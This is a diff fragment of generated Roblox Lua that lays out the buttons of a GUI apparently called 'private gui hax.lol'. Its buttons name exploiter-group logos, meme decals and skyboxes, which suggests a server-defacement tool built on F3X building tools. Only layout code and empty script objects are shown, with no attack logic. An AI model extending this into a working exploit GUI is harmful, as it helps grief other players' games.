+G2L["101"]["Name"] = [[Button]];
+G2L["101"]["Position"] = UDim2.new(-4.02571, 0, 34.42509, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["102"] = Instance.new("LocalScript", G2L["101"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["103"] = Instance.new("TextButton", G2L["7a"]);
+G2L["103"]["TextWrapped"] = true;
+G2L["103"]["BorderSizePixel"] = 3;
+G2L["103"]["TextSize"] = 14;
+G2L["103"]["TextScaled"] = true;
+G2L["103"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["103"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["103"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["103"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["103"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["103"]["Text"] = [[Old cZerkidd]];
+G2L["103"]["Name"] = [[Button]];
+G2L["103"]["Position"] = UDim2.new(-4.02571, 0, 32.98759, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["104"] = Instance.new("LocalScript", G2L["103"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["105"] = Instance.new("TextButton", G2L["7a"]);
+G2L["105"]["TextWrapped"] = true;
+G2L["105"]["BorderSizePixel"] = 3;
+G2L["105"]["TextSize"] = 14;
+G2L["105"]["TextScaled"] = true;
+G2L["105"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["105"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["105"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["105"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["105"]["BorderColor3"] = Color3.fromRGB(0, 167, 0);
+G2L["105"]["Text"] = [[k00pkidd]];
+G2L["105"]["Name"] = [[Button]];
+G2L["105"]["Position"] = UDim2.new(-1.35203, 0, 34.42509, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["106"] = Instance.new("LocalScript", G2L["105"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["107"] = Instance.new("TextButton", G2L["7a"]);
+G2L["107"]["TextWrapped"] = true;
+G2L["107"]["BorderSizePixel"] = 3;
+G2L["107"]["TextSize"] = 14;
+G2L["107"]["TextScaled"] = true;
+G2L["107"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["107"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["107"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["107"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["107"]["BorderColor3"] = Color3.fromRGB(0, 48, 255);
+G2L["107"]["Text"] = [[Team skrubl0rdz Logo]];
+G2L["107"]["Name"] = [[Button]];
+G2L["107"]["Position"] = UDim2.new(-0.00466, 0, 34.42509, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["108"] = Instance.new("LocalScript", G2L["107"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["109"] = Instance.new("TextButton", G2L["7a"]);
+G2L["109"]["TextWrapped"] = true;
+G2L["109"]["BorderSizePixel"] = 3;
+G2L["109"]["TextSize"] = 14;
+G2L["109"]["TextScaled"] = true;
+G2L["109"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["109"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["109"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["109"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["109"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["109"]["Text"] = [[Troll face Luffy]];
+G2L["109"]["Name"] = [[Button]];
+G2L["109"]["Position"] = UDim2.new(-5.30993, 0, 35.95634, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["10a"] = Instance.new("LocalScript", G2L["109"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["10b"] = Instance.new("TextButton", G2L["7a"]);
+G2L["10b"]["TextWrapped"] = true;
+G2L["10b"]["BorderSizePixel"] = 3;
+G2L["10b"]["TextSize"] = 14;
+G2L["10b"]["TextScaled"] = true;
+G2L["10b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["10b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["10b"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["10b"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["10b"]["BorderColor3"] = Color3.fromRGB(255, 0, 0);
+G2L["10b"]["Text"] = [[Team c00lkidd Logo]];
+G2L["10b"]["Name"] = [[Button]];
+G2L["10b"]["Position"] = UDim2.new(-4.02571, 0, 35.95634, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["10c"] = Instance.new("LocalScript", G2L["10b"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["10d"] = Instance.new("TextButton", G2L["7a"]);
+G2L["10d"]["TextWrapped"] = true;
+G2L["10d"]["BorderSizePixel"] = 3;
+G2L["10d"]["TextSize"] = 14;
+G2L["10d"]["TextScaled"] = true;
+G2L["10d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["10d"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["10d"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["10d"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["10d"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["10d"]["Text"] = [[Team Elv4r0x]];
+G2L["10d"]["Name"] = [[Button]];
+G2L["10d"]["Position"] = UDim2.new(-2.66782, 0, 35.95634, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["10e"] = Instance.new("LocalScript", G2L["10d"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["10f"] = Instance.new("TextButton", G2L["7a"]);
+G2L["10f"]["TextWrapped"] = true;
+G2L["10f"]["BorderSizePixel"] = 3;
+G2L["10f"]["TextSize"] = 14;
+G2L["10f"]["TextScaled"] = true;
+G2L["10f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["10f"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["10f"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["10f"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["10f"]["BorderColor3"] = Color3.fromRGB(255, 0, 5);
+G2L["10f"]["Text"] = [[LNicky FanClub Logo]];
+G2L["10f"]["Name"] = [[Button]];
+G2L["10f"]["Position"] = UDim2.new(-1.35203, 0, 35.95634, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["110"] = Instance.new("LocalScript", G2L["10f"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["111"] = Instance.new("TextButton", G2L["7a"]);
+G2L["111"]["TextWrapped"] = true;
+G2L["111"]["BorderSizePixel"] = 3;
+G2L["111"]["TextSize"] = 14;
+G2L["111"]["TextScaled"] = true;
+G2L["111"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["111"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["111"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["111"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["111"]["BorderColor3"] = Color3.fromRGB(255, 0, 0);
+G2L["111"]["Text"] = [[Picklelover]];
+G2L["111"]["Name"] = [[Button]];
+G2L["111"]["Position"] = UDim2.new(-0.00466, 0, 35.95634, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["112"] = Instance.new("LocalScript", G2L["111"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["113"] = Instance.new("TextButton", G2L["7a"]);
+G2L["113"]["TextWrapped"] = true;
+G2L["113"]["BorderSizePixel"] = 3;
+G2L["113"]["TextSize"] = 14;
+G2L["113"]["TextScaled"] = true;
+G2L["113"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["113"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["113"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["113"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["113"]["BorderColor3"] = Color3.fromRGB(255, 0, 0);
+G2L["113"]["Text"] = [[Old Roblox logo]];
+G2L["113"]["Name"] = [[Button]];
+G2L["113"]["Position"] = UDim2.new(-5.30993, 0, 37.61259, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["114"] = Instance.new("LocalScript", G2L["113"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["115"] = Instance.new("TextButton", G2L["7a"]);
+G2L["115"]["TextWrapped"] = true;
+G2L["115"]["BorderSizePixel"] = 3;
+G2L["115"]["TextSize"] = 14;
+G2L["115"]["TextScaled"] = true;
+G2L["115"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["115"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["115"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["115"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["115"]["BorderColor3"] = Color3.fromRGB(255, 0, 0);
+G2L["115"]["Text"] = [[c00lkidd + no torso text]];
+G2L["115"]["Name"] = [[Button]];
+G2L["115"]["Position"] = UDim2.new(-4.02571, 0, 37.61259, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["116"] = Instance.new("LocalScript", G2L["115"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["117"] = Instance.new("TextButton", G2L["7a"]);
+G2L["117"]["TextWrapped"] = true;
+G2L["117"]["BorderSizePixel"] = 3;
+G2L["117"]["TextSize"] = 14;
+G2L["117"]["TextScaled"] = true;
+G2L["117"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["117"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["117"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["117"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["117"]["BorderColor3"] = Color3.fromRGB(36, 252, 255);
+G2L["117"]["Text"] = [[Ro-xploit Logo]];
+G2L["117"]["Name"] = [[Button]];
+G2L["117"]["Position"] = UDim2.new(-2.66782, 0, 37.61259, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["118"] = Instance.new("LocalScript", G2L["117"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["119"] = Instance.new("TextButton", G2L["7a"]);
+G2L["119"]["TextWrapped"] = true;
+G2L["119"]["BorderSizePixel"] = 3;
+G2L["119"]["TextSize"] = 14;
+G2L["119"]["TextScaled"] = true;
+G2L["119"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["119"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["119"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["119"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["119"]["BorderColor3"] = Color3.fromRGB(157, 163, 39);
+G2L["119"]["Text"] = [[Spartan 300 leonidas]];
+G2L["119"]["Name"] = [[Button]];
+G2L["119"]["Position"] = UDim2.new(-1.35203, 0, 37.64384, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["11a"] = Instance.new("LocalScript", G2L["119"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["11b"] = Instance.new("TextButton", G2L["7a"]);
+G2L["11b"]["TextWrapped"] = true;
+G2L["11b"]["BorderSizePixel"] = 3;
+G2L["11b"]["TextSize"] = 14;
+G2L["11b"]["TextScaled"] = true;
+G2L["11b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["11b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["11b"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["11b"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["11b"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["11b"]["Text"] = [[Anonymous logo]];
+G2L["11b"]["Name"] = [[Button]];
+G2L["11b"]["Position"] = UDim2.new(-0.00466, 0, 37.64384, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["11c"] = Instance.new("LocalScript", G2L["11b"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["11d"] = Instance.new("TextButton", G2L["7a"]);
+G2L["11d"]["TextWrapped"] = true;
+G2L["11d"]["BorderSizePixel"] = 3;
+G2L["11d"]["TextSize"] = 14;
+G2L["11d"]["TextScaled"] = true;
+G2L["11d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["11d"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["11d"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["11d"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["11d"]["BorderColor3"] = Color3.fromRGB(167, 167, 167);
+G2L["11d"]["Text"] = [[Mac tonight (moonman)]];
+G2L["11d"]["Name"] = [[Button]];
+G2L["11d"]["Position"] = UDim2.new(-5.30993, 0, 39.30009, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["11e"] = Instance.new("LocalScript", G2L["11d"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["11f"] = Instance.new("TextButton", G2L["7a"]);
+G2L["11f"]["TextWrapped"] = true;
+G2L["11f"]["BorderSizePixel"] = 3;
+G2L["11f"]["TextSize"] = 14;
+G2L["11f"]["TextScaled"] = true;
+G2L["11f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["11f"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["11f"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["11f"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["11f"]["BorderColor3"] = Color3.fromRGB(193, 196, 127);
+G2L["11f"]["Text"] = [[thomas (coolkid)]];
+G2L["11f"]["Name"] = [[Button]];
+G2L["11f"]["Position"] = UDim2.new(-4.02571, 0, 39.30009, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["120"] = Instance.new("LocalScript", G2L["11f"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["121"] = Instance.new("TextButton", G2L["7a"]);
+G2L["121"]["TextWrapped"] = true;
+G2L["121"]["BorderSizePixel"] = 3;
+G2L["121"]["TextSize"] = 14;
+G2L["121"]["TextScaled"] = true;
+G2L["121"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["121"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["121"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["121"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["121"]["BorderColor3"] = Color3.fromRGB(255, 255, 0);
+G2L["121"]["Text"] = [[IShowEyes]];
+G2L["121"]["Name"] = [[Button]];
+G2L["121"]["Position"] = UDim2.new(-2.66782, 0, 39.30009, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["122"] = Instance.new("LocalScript", G2L["121"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["123"] = Instance.new("TextButton", G2L["7a"]);
+G2L["123"]["TextWrapped"] = true;
+G2L["123"]["BorderSizePixel"] = 3;
+G2L["123"]["TextSize"] = 14;
+G2L["123"]["TextScaled"] = true;
+G2L["123"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["123"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["123"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["123"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["123"]["BorderColor3"] = Color3.fromRGB(255, 0, 0);
+G2L["123"]["Text"] = [[1x1x1x1]];
+G2L["123"]["Name"] = [[Button]];
+G2L["123"]["Position"] = UDim2.new(-1.35203, 0, 39.30009, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["124"] = Instance.new("LocalScript", G2L["123"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["125"] = Instance.new("TextButton", G2L["7a"]);
+G2L["125"]["TextWrapped"] = true;
+G2L["125"]["BorderSizePixel"] = 3;
+G2L["125"]["TextSize"] = 14;
+G2L["125"]["TextScaled"] = true;
+G2L["125"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["125"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["125"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["125"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["125"]["BorderColor3"] = Color3.fromRGB(112, 112, 112);
+G2L["125"]["Text"] = [[scary face]];
+G2L["125"]["Name"] = [[Button]];
+G2L["125"]["Position"] = UDim2.new(-0.00466, 0, 39.30009, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["126"] = Instance.new("LocalScript", G2L["125"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["127"] = Instance.new("TextButton", G2L["7a"]);
+G2L["127"]["TextWrapped"] = true;
+G2L["127"]["BorderSizePixel"] = 3;
+G2L["127"]["TextSize"] = 14;
+G2L["127"]["TextScaled"] = true;
+G2L["127"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["127"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["127"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["127"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["127"]["BorderColor3"] = Color3.fromRGB(255, 223, 89);
+G2L["127"]["Text"] = [[epik face]];
+G2L["127"]["Name"] = [[Button]];
+G2L["127"]["Position"] = UDim2.new(-5.30993, 0, 40.92509, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["128"] = Instance.new("LocalScript", G2L["127"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["129"] = Instance.new("TextButton", G2L["7a"]);
+G2L["129"]["TextWrapped"] = true;
+G2L["129"]["BorderSizePixel"] = 3;
+G2L["129"]["TextSize"] = 14;
+G2L["129"]["TextScaled"] = true;
+G2L["129"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["129"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["129"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["129"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["129"]["BorderColor3"] = Color3.fromRGB(85, 174, 0);
+G2L["129"]["Text"] = [[Art Of Exploitation]];
+G2L["129"]["Name"] = [[Button]];
+G2L["129"]["Position"] = UDim2.new(-4.02571, 0, 40.92509, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["12a"] = Instance.new("LocalScript", G2L["129"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["12b"] = Instance.new("TextButton", G2L["7a"]);
+G2L["12b"]["TextWrapped"] = true;
+G2L["12b"]["BorderSizePixel"] = 3;
+G2L["12b"]["TextSize"] = 14;
+G2L["12b"]["TextScaled"] = true;
+G2L["12b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["12b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["12b"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["12b"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["12b"]["BorderColor3"] = Color3.fromRGB(40, 183, 0);
+G2L["12b"]["Text"] = [[Old Team k00pkidd Logo]];
+G2L["12b"]["Name"] = [[Button]];
+G2L["12b"]["Position"] = UDim2.new(-2.66782, 0, 40.92509, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["12c"] = Instance.new("LocalScript", G2L["12b"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["12d"] = Instance.new("TextButton", G2L["7a"]);
+G2L["12d"]["TextWrapped"] = true;
+G2L["12d"]["BorderSizePixel"] = 3;
+G2L["12d"]["TextSize"] = 14;
+G2L["12d"]["TextScaled"] = true;
+G2L["12d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["12d"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["12d"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["12d"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["12d"]["BorderColor3"] = Color3.fromRGB(255, 223, 89);
+G2L["12d"]["Text"] = [[Shedletsky Price Floors]];
+G2L["12d"]["Name"] = [[Button]];
+G2L["12d"]["Position"] = UDim2.new(-1.35203, 0, 40.92509, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["12e"] = Instance.new("LocalScript", G2L["12d"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["12f"] = Instance.new("TextButton", G2L["7a"]);
+G2L["12f"]["TextWrapped"] = true;
+G2L["12f"]["BorderSizePixel"] = 3;
+G2L["12f"]["TextSize"] = 14;
+G2L["12f"]["TextScaled"] = true;
+G2L["12f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["12f"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["12f"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["12f"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["12f"]["BorderColor3"] = Color3.fromRGB(162, 162, 162);
+G2L["12f"]["Text"] = [[grumpy cat meme]];
+G2L["12f"]["Name"] = [[Button]];
+G2L["12f"]["Position"] = UDim2.new(-0.00466, 0, 40.92509, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["130"] = Instance.new("LocalScript", G2L["12f"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["131"] = Instance.new("TextButton", G2L["7a"]);
+G2L["131"]["TextWrapped"] = true;
+G2L["131"]["BorderSizePixel"] = 3;
+G2L["131"]["TextSize"] = 14;
+G2L["131"]["TextScaled"] = true;
+G2L["131"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["131"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["131"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["131"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["131"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["131"]["Text"] = [[Shocked Toad]];
+G2L["131"]["Name"] = [[Button]];
+G2L["131"]["Position"] = UDim2.new(-5.30993, 0, 42.55009, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["132"] = Instance.new("LocalScript", G2L["131"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["133"] = Instance.new("TextButton", G2L["7a"]);
+G2L["133"]["TextWrapped"] = true;
+G2L["133"]["BorderSizePixel"] = 3;
+G2L["133"]["TextSize"] = 14;
+G2L["133"]["TextScaled"] = true;
+G2L["133"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["133"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["133"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["133"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["133"]["BorderColor3"] = Color3.fromRGB(173, 0, 170);
+G2L["133"]["Text"] = [[Director Vivian]];
+G2L["133"]["Name"] = [[Button]];
+G2L["133"]["Position"] = UDim2.new(-4.02571, 0, 42.55009, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["134"] = Instance.new("LocalScript", G2L["133"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["135"] = Instance.new("TextButton", G2L["7a"]);
+G2L["135"]["TextWrapped"] = true;
+G2L["135"]["BorderSizePixel"] = 3;
+G2L["135"]["TextSize"] = 14;
+G2L["135"]["TextScaled"] = true;
+G2L["135"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["135"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["135"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["135"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["135"]["BorderColor3"] = Color3.fromRGB(255, 0, 0);
+G2L["135"]["Text"] = [[LNickyZ]];
+G2L["135"]["Name"] = [[Button]];
+G2L["135"]["Position"] = UDim2.new(-2.66782, 0, 42.55009, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["136"] = Instance.new("LocalScript", G2L["135"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["137"] = Instance.new("TextButton", G2L["7a"]);
+G2L["137"]["TextWrapped"] = true;
+G2L["137"]["BorderSizePixel"] = 3;
+G2L["137"]["TextSize"] = 14;
+G2L["137"]["TextScaled"] = true;
+G2L["137"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["137"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["137"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["137"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["137"]["BorderColor3"] = Color3.fromRGB(111, 194, 218);
+G2L["137"]["Text"] = [[Classic Roblox SkyBox]];
